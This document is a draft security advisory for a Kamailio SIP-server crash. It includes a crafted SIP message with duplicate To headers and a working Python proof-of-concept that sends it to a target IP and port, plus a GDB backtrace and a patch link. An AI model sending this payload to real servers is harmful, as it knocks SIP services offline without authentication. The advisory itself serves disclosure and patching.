# Parser segmentation fault crash in Kamailio, denial of service possible

- Authors:
    - Henning Westerholt <hw at skalatan.de>
- Fixed versions: Kamailio v5.1.4 and v5.0.7
- References: CVE-2018-XXXX
- Kamailio Security Advisory: https://www.kamailio.org/w/2018/03/TODO/
- Tested vulnerable versions: 5.1, 4.0, git master
- Timeline:
    - Report date: 2018-05-07
    - Kamailio patch: 2018-05-07
    - Kamailio release with patch: 2018-06-XX
    - Security advisory: 2018-06-XX

## Description

A specially crafted SIP message with double `To` header and a malformed To `tag` causes a segmentation fault and crashes Kamailio.

## Impact

Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution. This vulnerability is rather old and will probably also apply to older versions of Kamailio and maybe even OpenSER.

## How to reproduce the issue

The following SIP message was used to reproduce the issue with double `To` headers containing the `tag` that triggers the vulnerability:


```
REGISTER sip:127.0.0.1:0 SIP/2.0
Via: SIP/2.0/UDP 172.17.13.240:5061;branch=9hG4bKydcnjlpe
To: <@127.0.0.1>;tag=
From: 
To: <sip:>
Content-Length: 0
```

You can use this python script to reproduce the crash:

```
#!/usr/bin/env python
import socket
import sys

for _ in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((sys.argv[1], int(sys.argv[2])))

    msg = "REGISTER sip:127.0.0.1:0 SIP/2.0\n" \
        "Via: SIP/2.0/UDP 172.17.13.240:5061;branch=9hG4bKydcnjlpe\n" \
        "To: <@127.0.0.1>;tag=\n" \
        "From: \n" \
        "To: <sip:>\n" \
        "Content-Length: 1\n" \
        "\n" \
        "\r\n"
    sock.sendall(msg)
```

Run using:

```
python crash.py <ip> <port>
```

The expected result is a crash in Kamailio.

Notes: 

- authentication is not required
- crash happens in the first module that tries to construct a SIP reply caused by the bogus message
- SIP extension does not need to exist
- Message can be sent over TCP or UDP

### GDB backtrace result

An example for an backtrace caused by this crash in GDB:

```
Program terminated with signal SIGSEGV, Segmentation fault.
#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152
152     ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.
(gdb) bt
#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152
#1  0x000000000057ac26 in build_res_buf_from_sip_req (code=400, text=0x7ffc94ef0780, new_tag=0x7fe8e82ee250 <sl_tag>, msg=0x7fe8e923ca00, returned_len=0x7ffc94ef07e8, 
    bmark=0x7ffc94ef0790) at core/msg_translator.c:2502
#2  0x00007fe8e80de2ee in sl_reply_helper (msg=0x7fe8e923ca00, code=400, reason=0x7fe8e6a7e85b "Content-Length mis-match", tag=0x0) at sl_funcs.c:168
#3  0x00007fe8e80df4c3 in sl_send_reply (msg=0x7fe8e923ca00, code=400, reason=0x7fe8e6a7e85b "Content-Length mis-match") at sl_funcs.c:304
#4  0x00007fe8e6a6d34f in sanity_reply (msg=0x7fe8e923ca00, code=400, reason=0x7fe8e6a7e85b "Content-Length mis-match") at sanity.c:55
#5  0x00007fe8e6a727b5 in check_cl (_msg=0x7fe8e923ca00) at sanity.c:557
#6  0x00007fe8e6a7c97a in sanity_check (_msg=0x7fe8e923ca00, msg_checks=1511, uri_checks=7) at sanity_mod.c:194
#7  0x00007fe8e6a7cb0a in w_sanity_check (_msg=0x7fe8e923ca00, _number=0x5e7 <error: Cannot access memory at address 0x5e7>, 
    _arg=0x7 <error: Cannot access memory at address 0x7>) at sanity_mod.c:254
#8  0x0000000000439780 in do_action (h=0x7ffc94ef1160, a=0x7fe8e9210960, msg=0x7fe8e923ca00) at core/action.c:1079
#9  0x0000000000445e1d in run_actions (h=0x7ffc94ef1160, a=0x7fe8e9210960, msg=0x7fe8e923ca00) at core/action.c:1565
#10 0x00000000004464fa in run_actions_safe (h=0x7ffc94ef2480, a=0x7fe8e9210960, msg=0x7fe8e923ca00) at core/action.c:1633
#11 0x0000000000646d88 in rval_get_int (h=0x7ffc94ef2480, msg=0x7fe8e923ca00, i=0x7ffc94ef15e8, rv=0x7fe8e9211598, cache=0x0) at core/rvalue.c:912
#12 0x000000000064b31f in rval_expr_eval_int (h=0x7ffc94ef2480, msg=0x7fe8e923ca00, res=0x7ffc94ef15e8, rve=0x7fe8e9211590) at core/rvalue.c:1910
#13 0x000000000064b75d in rval_expr_eval_int (h=0x7ffc94ef2480, msg=0x7fe8e923ca00, res=0x7ffc94ef1a90, rve=0x7fe8e9210d78) at core/rvalue.c:1918
#14 0x0000000000439145 in do_action (h=0x7ffc94ef2480, a=0x7fe8e92121a0, msg=0x7fe8e923ca00) at core/action.c:1043
#15 0x0000000000445e1d in run_actions (h=0x7ffc94ef2480, a=0x7fe8e920cda8, msg=0x7fe8e923ca00) at core/action.c:1565
#16 0x00000000004360c5 in do_action (h=0x7ffc94ef2480, a=0x7fe8e91fb420, msg=0x7fe8e923ca00) at core/action.c:691
#17 0x0000000000445e1d in run_actions (h=0x7ffc94ef2480, a=0x7fe8e91fb420, msg=0x7fe8e923ca00) at core/action.c:1565
#18 0x00000000004465c2 in run_top_route (a=0x7fe8e91fb420, msg=0x7fe8e923ca00, c=0x0) at core/action.c:1654
#19 0x0000000000587d61 in receive_msg (
    buf=0xa525e0 <buf> "REGISTER sip:127.0.0.1:0 SIP/2.0\nVia: SIP/2.0/UDP 172\035\061\067.13.240:5061;rport;branch=\223\071hG4bKydcnjlpe\nMax-Forwards: 69\nTo: <@127.0.0.1>;tag=;branch=z9hG4bKya-tag\nFrom: <sip:user@127.0.0.Forwards: 70\nTo: <"..., len=417, rcv_info=0x7ffc94ef2aa0) at core/receive.c:331
#20 0x000000000046ca74 in udp_rcv_loop () at core/udp_server.c:554
#21 0x00000000004253d1 in main_loop () at main.c:1432
#22 0x000000000042d631 in main (argc=16, argv=0x7ffc94ef2fc8) at main.c:2650
```

This security issue was discovered through the use of several month of fuzzing with [afl](http://lcamtuf.coredump.cx/afl/) and an internal toolset.

## Solutions and recommendations

Apply the patch at <https://github.com/kamailio/kamailio/commit/281a6c6b6eaaf30058b603325e8ded20b99e1456> or make use of a release that includes that patch (e.g. 5.1.4 or 5.0.7).

## About Henning Westerholt

[Henning Westerholt]<https://www.kamailio.org/w/henning-westerholt/> is a core developer of Kamailio since 2007. He provides consulting services for Kamailio. 

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
